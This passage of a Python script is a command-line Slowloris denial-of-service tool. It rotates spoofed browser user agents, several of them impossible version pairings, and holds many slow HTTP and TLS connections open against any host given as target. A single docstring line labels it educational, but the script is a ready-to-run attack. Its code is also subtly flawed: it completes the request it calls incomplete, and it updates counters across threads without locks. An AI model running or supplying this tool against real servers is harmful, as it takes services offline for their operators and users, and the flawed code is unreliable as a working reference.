    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:22) Gecko/20100101 Firefox/22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:21) Gecko/20100101 Firefox/21",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:20) Gecko/20100101 Firefox/20",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:19) Gecko/20100101 Firefox/19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:18) Gecko/20100101 Firefox/18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:17) Gecko/20100101 Firefox/17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:16) Gecko/20100101 Firefox/16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:15) Gecko/20100101 Firefox/15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:14) Gecko/20100101 Firefox/14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:13) Gecko/20100101 Firefox/13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:12) Gecko/20100101 Firefox/12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:11) Gecko/20100101 Firefox/11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:10) Gecko/20100101 Firefox/10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:9) Gecko/20100101 Firefox/9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:8) Gecko/20100101 Firefox/8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:7) Gecko/20100101 Firefox/7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:6) Gecko/20100101 Firefox/6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:5) Gecko/20100101 Firefox/5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:4) Gecko/20100101 Firefox/4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:3) Gecko/20100101 Firefox/3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:2) Gecko/20100101 Firefox/2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:1) Gecko/20100101 Firefox/1",
]

def get_random_user_agent():
    """Return a random user agent string from the list."""
    return random.choice(USER_AGENTS)

def slowloris_attack(target, port=80, duration=10, threads=50, max_requests=9000):
    """
    Slowloris attack - keeps connections open with slow HTTP requests.
    Educational use only on authorized systems.
    
    This attack exploits the way web servers handle HTTP connections.
    It opens many connections and sends data very slowly, keeping
    the connections open and exhausting the server's connection pool.
    
    Args:
        target: Target hostname or URL
        port: Target port (default: 80)
        duration: Attack duration in seconds (default: 10)
        threads: Number of concurrent threads (default: 50)
        max_requests: Maximum number of connections to create (default: 9000)
    """
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    
    user_agent = get_random_user_agent()
    
    # Parse URL if it's a full URL
    if target.startswith(('http://', 'https://')):
        parsed = urlparse(target)
        hostname = parsed.hostname
        if parsed.port:
            port = parsed.port
        elif parsed.scheme == 'https':
            port = 443
        else:
            port = 80
        path = parsed.path if parsed.path else '/'
    else:
        hostname = target
        path = '/'
    
    use_ssl = port == 443 or port == 8443
    
    print(f"{RED}[*]{RESET} Slowloris Attack on {CYAN}{hostname}:{port}{RESET}")
    print(f"{RED}[*]{RESET} Duration: {YELLOW}{duration}s{RESET} | Threads: {YELLOW}{threads}{RESET}")
    if max_requests:
        print(f"{RED}[*]{RESET} Max Requests: {YELLOW}{max_requests}{RESET}")
    print(f"{RED}[*]{RESET} User-Agent: {CYAN}{user_agent[:50]}...{RESET}")
    print(f"{RED}[*]{RESET} Attack Type: {GREEN}Layer 7 - Connection Exhaustion{RESET}")
    print(f"{RED}[*]{RESET} SSL/TLS: {GREEN}{'Yes' if use_ssl else 'No'}{RESET}")
    print(f"{RED}[*]{RESET} Started at {CYAN}{datetime.now().strftime('%H:%M:%S')}{RESET}")
    print()
    print(f"{YELLOW}[!]{RESET} This attack keeps connections open with slow data transmission.")
    print(f"{YELLOW}[!]{RESET} It targets the server's connection pool, not bandwidth.")
    print()

    connections_open = 0
    total_requests = 0
    total_bytes_sent = 0
    connection_errors = 0
    stop_event = threading.Event()
    
    # Stats for display
    peak_connections = 0
    requests_per_second = 0
    last_requests = 0
    last_update_time = time.time()

    def attack_thread():
        nonlocal connections_open, total_requests, total_bytes_sent, connection_errors, peak_connections
        while not stop_event.is_set():
            if max_requests and total_requests >= max_requests:
                break
            try:
                # Create TCP connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((hostname, port))

                # Wrap with SSL if needed
                if use_ssl:
                    try:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=hostname)
                    except Exception as e:
                        sock.close()
                        connection_errors += 1
                        continue

                # Send incomplete HTTP header
                header = f"GET {path} HTTP/1.1\r\n"
                header += f"Host: {hostname}\r\n"
                header += f"User-Agent: {user_agent}\r\n"
                header += "Connection: keep-alive\r\n"
                header += "Accept: */*\r\n"
                header += "\r\n"

                sock.send(header.encode())
                total_bytes_sent += len(header.encode())
                connections_open += 1
                total_requests += 1
                
                if connections_open > peak_connections:
                    peak_connections = connections_open

                # Keep connection alive with slow data
                while not stop_event.is_set():
                    try:
                        slow_data = b"X-a: b\r\n"
                        sock.send(slow_data)
                        total_bytes_sent += len(slow_data)
                        time.sleep(random.uniform(2, 8))  # Random slow send interval
                    except:
                        break

                sock.close()
                connections_open -= 1
            except Exception as e:
                connection_errors += 1
                time.sleep(0.1)

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads_list.append(t)

    start_time = time.time()
    last_time = start_time
    
    while time.time() - start_time < duration:
        if max_requests and total_requests >= max_requests:
            break
        time.sleep(0.1)
        
        current_time = time.time()
        elapsed = current_time - start_time
        
        # Calculate RPS every second
        if current_time - last_update_time >= 1.0:
            requests_per_second = (total_requests - last_requests) / (current_time - last_update_time)
            last_requests = total_requests
            last_update_time = current_time
        
        # Progress bar
        progress = (elapsed / duration) * 100
        bar_length = 40
        filled = int(bar_length * progress / 100)
        bar = '[' + '=' * filled + ' ' * (bar_length - filled) + ']'
        
        # Clear line and print stats
        sys.stdout.write('\r' + ' ' * 100 + '\r')
        
        if max_requests:
            print(f"{GREEN}[{progress:.1f}%]{RESET} {bar} {RED}Connections:{RESET} {CYAN}{connections_open}{RESET} {RED}Requests:{RESET} {CYAN}{total_requests}/{max_requests}{RESET} {RED}RPS:{RESET} {YELLOW}{requests_per_second:.1f}{RESET} {RED}Time:{RESET} {YELLOW}{elapsed:.0f}s/{duration}s{RESET} {RED}Errors:{RESET} {YELLOW}{connection_errors}{RESET}", end='')
        else:
            print(f"{GREEN}[{progress:.1f}%]{RESET} {bar} {RED}Connections:{RESET} {CYAN}{connections_open}{RESET} {RED}Requests:{RESET} {CYAN}{total_requests}{RESET} {RED}RPS:{RESET} {YELLOW}{requests_per_second:.1f}{RESET} {RED}Time:{RESET} {YELLOW}{elapsed:.0f}s/{duration}s{RESET} {RED}Errors:{RESET} {YELLOW}{connection_errors}{RESET}", end='')

    stop_event.set()
    print()
    print()
    print(f"{GREEN}[*]{RESET} Attack completed successfully")
    print(f"{RED}[*]{RESET} Peak connections held: {CYAN}{peak_connections}{RESET}")
    print(f"{RED}[*]{RESET} Total requests sent: {CYAN}{total_requests}{RESET}")
    print(f"{RED}[*]{RESET} Total bytes sent: {CYAN}{total_bytes_sent / 1024:.2f} KB{RESET}")
    print(f"{RED}[*]{RESET} Connection errors: {YELLOW}{connection_errors}{RESET}")
    print(f"{RED}[*]{RESET} Average RPS: {YELLOW}{total_requests / duration:.2f}{RESET}")
    print(f"{YELLOW}[!]{RESET} Note: Effectiveness depends on server connection limit.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python slowloris_toolkit.py <target> [port] [duration] [threads] [max_requests]")
        print("Example: python slowloris_toolkit.py example.com 80 60 100 90000")
        print("  target: Target hostname or URL")
        print("  port: Target port (default: 80)")
        print("  duration: Attack duration in seconds (default: 10)")
        print("  threads: Number of concurrent threads (default: 50)")
        print("  max_requests: Maximum number of connections to create (default: 9000)")
        return

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 50
    max_requests = int(sys.argv[5]) if len(sys.argv) > 5 else 9000

    slowloris_attack(target, port, duration, threads, max_requests)

if __name__ == "__main__":
    main()
